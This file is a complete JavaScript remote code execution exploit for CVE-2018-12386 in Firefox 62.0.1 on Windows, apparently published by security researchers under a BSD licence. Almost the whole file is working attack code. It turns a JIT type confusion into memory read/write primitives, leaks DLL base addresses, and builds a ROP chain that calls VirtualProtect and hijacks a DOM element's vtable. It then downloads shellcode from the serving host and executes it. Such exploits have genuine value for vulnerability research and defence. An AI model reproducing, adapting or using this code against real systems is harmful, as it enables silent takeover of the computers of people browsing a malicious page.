// RCE exploit for CVE-2018-12386
// Firefox 62.0.1 Windows
// 
// Exploit by saelo & niklasb

/*
Copyright (c) 2018, Niklas Baumstark & Samuel Groß
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

The views and conclusions contained in the software and documentation are those
of the authors and should not be interpreted as representing official policies,
either expressed or implied, of the FreeBSD Project.
*/
var convert = new ArrayBuffer(0x100);
var u32 = new Uint32Array(convert);
var f64 = new Float64Array(convert);

var scratch = new ArrayBuffer(0x100000);
var scratch_u8 = new Uint8Array(scratch);
var scratch_u32 = new Uint32Array(scratch);
var BASE = 0x100000000;

var shellcode = null;

function hex(x) {
    return `0x${x.toString(16)}`
}

function bytes_to_u64(bytes) {
    return (bytes[0]+bytes[1]*0x100+bytes[2]*0x10000+bytes[3]*0x1000000
                +bytes[4]*0x100000000+bytes[5]*0x10000000000);
}

function i2f(x) {
    u32[0] = x % BASE;
    u32[1] = (x - (x % BASE)) / BASE;
    return f64[0];
}

function f2i(x) {
    f64[0] = x;
    return u32[0] + BASE * u32[1];
}

function fail(msg) {
    print("FAIL " + msg);
    throw null;
}

function setup() {
    var container = {a: {}};
    var master = new Float64Array(0x100);
    var victim = new Uint8Array(0x100);

    var objs = [];
    for (var i = 0; i < 100; i++) {
        let x = {x: 13.37, y:victim, z:container};
        objs[i] = {x: 'asd', p1: {}, p2: {}, p3: {}, p4: x, p5: x, p6: {}};
    }
    var o = objs[0];
    var a = new Float64Array(1024);

    function f(a, b) {
        let p = b;
        for (; p.x < 0; p = p.x)
            while (p === p) {}
        for (var i = 0; i < 10000000; ++i){ }
        if (action==1) {
            victim_addr_f = a[3];
            container_addr_f = a[4];
        } else {
            a[7] = victim_addr_f;
        }
    }

    action = 1;
    for (var j = 0; j < 5; ++j)
        f(a, o);

    var victim_addr = f2i(victim_addr_f);
    var container_addr = f2i(container_addr_f);
    //print('victim @ ' + hex(victim_addr) + ' / container @ ' + hex(container_addr));

    var objs = [];
    for (var i = 0; i < 100; i++) {
        objs[i] = {x: 'asd', p1: {}, p2: {}, p3: {}, p4: {}, p5: master};
    }
    var o = objs[0];

    action = 2;
    for (var j = 0; j < 5; ++j)
        f(a, o);

    function set_addr(where) {
        master[7] = i2f(where);
    }

    function read64(where) {
        set_addr(where);
        var res = 0;
        for (var i = 7; i >= 0; --i) {
            res = res*0x100 + victim[i];
        }
        return res;
    }

    function read48(where) {
        set_addr(where);
        var res = 0;
        for (var i = 5; i >= 0; --i) {
            res = res*0x100 + victim[i];
        }
        return res;
    }

    function write64(where, what) {
        set_addr(where);
        for (var i = 0; i < 8; ++i) {
            victim[i] = what%0x100;
            what = (what-what%0x100)/0x100;
        }
    }

    function addrof2(x) {
        container.a = x;
        return read48(container_addr + 0x20);
    }

    function check() {
        print('master/victim: ' + hex(addrof2(master)) + ' ' + hex(addrof2(victim)));
    }

    function test() {
        var x = {x:0x1337};
        if (read48(addrof2(x)+0x20)%0x10000 != 0x1337) {
            check();
            fail("R/W does not work");
        }
    }

    return {
        addrof: addrof2,
        read64: read64,
        write64: write64,
        read48: read48,
        check: check,
        test: test,
    };
}

VERSION = '62.0';

function pwn() {
    var mem = setup();
    mem.test();

    var scratch_addr = mem.read64(mem.addrof(scratch_u8) + 0x38);

    var sc_offset = 0x20000 - scratch_addr % 0x1000;
    var sc_addr = scratch_addr + sc_offset
    scratch_u8.set(shellcode, sc_offset);


    var el = document.createElementNS('http://www.w3.org/2000/svg', 'image');
    var wrapper_addr = mem.addrof(el);
    var native_addr = mem.read64(wrapper_addr + 0x18);

    if (VERSION == '62.0') {
        var xul = native_addr - 0x31205f8;
        var ntdll = mem.read64(xul + 0x311CEE8) - 0x9a0e0 // NtQueryObject
        var kernel32 = mem.read64(xul + 0x3119B60) - 0x1a1c0 // GetModuleHandleW

        var pop_gadgets = [
            xul + 0xc712f, // pop rcx ; ret
            xul + 0x140222, // pop rdx ; ret
            xul + 0x611655, // pop r8 ; ret
            xul + 0xd1a6a1, // pop r9 ; ret
        ];
    } else {
        fail("Unknown version");
    }
    //print('xul.dll @ ' + hex(xul));
    //print('ntdll @ ' + hex(ntdll));
    //print('kernel32 @ ' + hex(kernel32));

    // part of __longjmp_internal
    var gadget = ntdll + 0xA0705;

    var el = document.createElement('div');
    var el_addr = mem.read64(mem.addrof(el) + 0x20) * 2;
    //print('elem @ ' + hex(el_addr));

    var fake_vtab = scratch_addr;
    //print('vtab @ ' + hex(fake_vtab));
    for (var i = 0; i < 100; ++i) {
        scratch_u32[2*i] = gadget % BASE;
        scratch_u32[2*i+1] = (gadget - gadget % BASE) / BASE;
    }

    var fake_stack = scratch_addr + 0x10000;

    var stack = [
        pop_gadgets[0],
        sc_addr,
        pop_gadgets[1],
        0x1000,
        pop_gadgets[2],
        0x40,
        pop_gadgets[3],
        scratch_addr,
        kernel32 + 0x193d0, // VirtualProtect
        sc_addr,
    ];
    for (var i = 0; i < stack.length; ++i) {
        scratch_u32[0x10000/4 + 2*i] = stack[i] % BASE;
        scratch_u32[0x10000/4 + 2*i + 1] = stack[i] / BASE;
    }

    mem.write64(el_addr + 0x10, fake_stack); // RSP
    mem.write64(el_addr + 0x50, pop_gadgets[0] + 1); // RIP = ret
    mem.write64(el_addr, fake_vtab);

    //print('element @ ' + hex(el_addr));

    //el.setAttribute('height', '100');
    el.addEventListener('click', function (e) {}, false);
    el.dispatchEvent(new Event('click'));
}

function print_error(e) {
    print('Error: ' + e + '\n' + e.stack)
}

async function exploit() {
    try {
        let resp = await fetch('/shellcode');
        let buffer = await resp.arrayBuffer();
        shellcode_length = buffer.byteLength;
        if (shellcode_length > 0x1000000) {
            fail(5);
        }
        shellcode = new Uint8Array(buffer);
        //print('got ' + shellcode_length + ' bytes of shellcode, pwning');
        pwn();
    } catch (e) {
        print_error(e);
    }
}

exploit();
